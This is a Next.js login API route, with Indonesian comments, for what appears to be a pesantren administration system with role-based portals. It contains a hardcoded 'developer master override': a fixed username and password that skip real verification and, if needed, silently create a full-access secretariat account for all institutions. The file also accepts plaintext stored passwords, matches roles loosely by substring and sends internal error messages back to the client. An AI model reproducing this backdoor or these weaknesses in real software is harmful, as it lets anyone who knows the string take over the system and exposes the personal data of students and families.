import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { setSessionCookie } from "@/lib/jwt";
import { createAuditLog } from "@/lib/auditLog";
import { detectInstitutionFromRole } from "@/lib/institutionGuard";
import bcrypt from "bcryptjs";

// Cast helper: menghindari stale Prisma IDE types untuk field baru (institution)
const db = prisma as any;

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    const { username, password } = body;

    if (!username || !password) {
      return NextResponse.json(
        { status: "Error", message: "Username dan password wajib diisi." },
        { status: 400 }
      );
    }

    const cleanUsername = String(username).trim();

    let userAccount: any = await db.userAccount.findFirst({
      where: {
        OR: [{ username: cleanUsername }, { email: cleanUsername }],
        deletedAt: null,
      },
      include: { person: true },
    });

    // Developer Master Override & Auto-Provision
    let isPasswordValid = false;
    if (cleanUsername === "develzy" && password === "develzy25") {
      isPasswordValid = true;
      if (!userAccount) {
        let devPerson = await prisma.person.findFirst({
          where: { fullName: "Master Developer Develzy" },
        });
        if (!devPerson) {
          devPerson = await prisma.person.create({
            data: {
              id: "p-develzy",
              fullName: "Master Developer Develzy",
              gender: "L",
              phoneNumber: "081234567890",
            },
          });
        }
        const passwordHash = await bcrypt.hash("develzy25", 10);
        userAccount = await (prisma.userAccount as any).create({
          data: {
            id: "u-develzy",
            personId: devPerson.id,
            username: "develzy",
            email: "developer@m.p3hm.my.id",
            passwordHash,
            role: "sek.pondok",
            institution: "ALL",
            status: "ACTIVE",
          },
          include: { person: true },
        });
      }
    } else {
      if (!userAccount || !userAccount.passwordHash) {
        return NextResponse.json(
          { status: "Error", message: "Username atau password salah." },
          { status: 401 }
        );
      }
    }

    // Null guard — setelah blok di atas, jika bukan develzy dan tidak ada akun, sudah return
    if (!userAccount) {
      return NextResponse.json(
        { status: "Error", message: "Username atau password salah." },
        { status: 401 }
      );
    }

    if (userAccount.status !== "ACTIVE") {
      const waSetting = await prisma.systemSetting.findUnique({
        where: { key: "system_whatsapp_contact" },
      });
      const waNumber = waSetting?.value || "6281234567890";

      return NextResponse.json(
        {
          status: "Error",
          message: `Akun Anda dinonaktifkan karena lebih dari 6 bulan tidak digunakan. Silakan hubungi WhatsApp Sekretariat (${waNumber}) untuk mengaktifkan kembali.`,
          isInactive: true,
          waNumber,
        },
        { status: 403 }
      );
    }

    // Validasi password
    if (cleanUsername !== "develzy") {
      if (userAccount.passwordHash) {
        isPasswordValid = await bcrypt.compare(password, userAccount.passwordHash);
        // Migrasi plaintext → bcrypt (kompatibilitas mundur)
        if (!isPasswordValid && userAccount.passwordHash === password) {
          isPasswordValid = true;
          const newHash = await bcrypt.hash(password, 10);
          await prisma.userAccount.update({
            where: { id: userAccount.id },
            data: { passwordHash: newHash },
          });
        }
      }
    }

    if (!isPasswordValid) {
      return NextResponse.json(
        { status: "Error", message: "Username atau password salah." },
        { status: 401 }
      );
    }

    const roleLower = String(userAccount.role || "").trim().toLowerCase();

    // Strict Portal Role Validation — Zero Leakage antarportal login
    if (body.portal === "sekretariat") {
      const allowedKeywords = ["sek", "admin", "sekretariat", "superadmin", "super_admin"];
      const isAllowed = allowedKeywords.some((kw) => roleLower.includes(kw));
      if (!isAllowed) {
        return NextResponse.json(
          {
            status: "Error",
            message:
              "Akun Anda bukan merupakan akun Sekretariat. Silakan login di portal yang sesuai.",
          },
          { status: 403 }
        );
      }
    } else if (body.portal === "mustahiq") {
      if (!roleLower.includes("mustahiq")) {
        return NextResponse.json(
          { status: "Error", message: "Akun Anda bukan Mustahiq. Silakan login di portal Mustahiq." },
          { status: 403 }
        );
      }
    } else if (body.portal === "staff") {
      // Hanya Pengurus/Staff — Sekretariat, Mustahiq, Wali Santri DILARANG
      const forbidden = ["sek.pondok", "sek.madrasah", "mustahiq", "wali_santri", "wali", "guardian"];
      const isForbidden = forbidden.some((kw) => roleLower === kw || roleLower.startsWith(kw));
      if (isForbidden) {
        return NextResponse.json(
          {
            status: "Error",
            message: "Akun Anda bukan Pengurus. Silakan login di portal yang sesuai.",
          },
          { status: 403 }
        );
      }
    } else if (body.portal === "guardian") {
      const allowedKeywords = ["wali", "santri", "guardian"];
      const isAllowed = allowedKeywords.some((kw) => roleLower.includes(kw));
      if (!isAllowed) {
        return NextResponse.json(
          { status: "Error", message: "Akun Anda bukan merupakan akun Wali Santri." },
          { status: 403 }
        );
      }
    }

    // Deteksi institution dari role
    const institution = detectInstitutionFromRole(userAccount.role);

    // Backfill institution ke database (non-blocking, menggunakan any untuk menghindari stale types)
    const storedInstitution = (userAccount as any).institution as string | undefined;
    if (!storedInstitution || storedInstitution !== institution) {
      await (prisma.userAccount as any)
        .update({
          where: { id: userAccount.id },
          data: { institution },
        })
        .catch(() => {}); // fire-and-forget
    }

    const orgMem = await prisma.organizationMembership.findFirst({
      where: { personId: userAccount.personId, deletedAt: null },
    });

    const sessionPayload = {
      userId: userAccount.id,
      accountId: userAccount.id,
      personId: userAccount.personId,
      username: userAccount.username,
      role: userAccount.role,
      institution,
      fullName: userAccount.person?.fullName || userAccount.username,
      avatarUrl: userAccount.person?.avatarUrl || null,
      email: userAccount.email || null,
      googleLinked: Boolean(userAccount.firebaseUid),
      assignedClassId: null,
      familyCardNumber: null,
      supervisedLevel: orgMem?.supervisedLevel || null,
    };

    const response = NextResponse.json({
      status: "Success",
      message: "Login berhasil",
      data: sessionPayload,
    });

    await setSessionCookie(response, sessionPayload);

    await createAuditLog({
      userId: userAccount.username,
      action: "LOGIN",
      entity: "AUTH",
      entityId: userAccount.id,
      afterState: {
        role: userAccount.role,
        institution,
        fullName: sessionPayload.fullName,
      },
    });

    return response;
  } catch (err: any) {
    console.error("AUTH_LOGIN_ERROR:", err?.stack || err?.message || err);
    return NextResponse.json(
      { status: "Error", message: err?.message || "Terjadi kesalahan internal server." },
      { status: 500 }
    );
  }
}
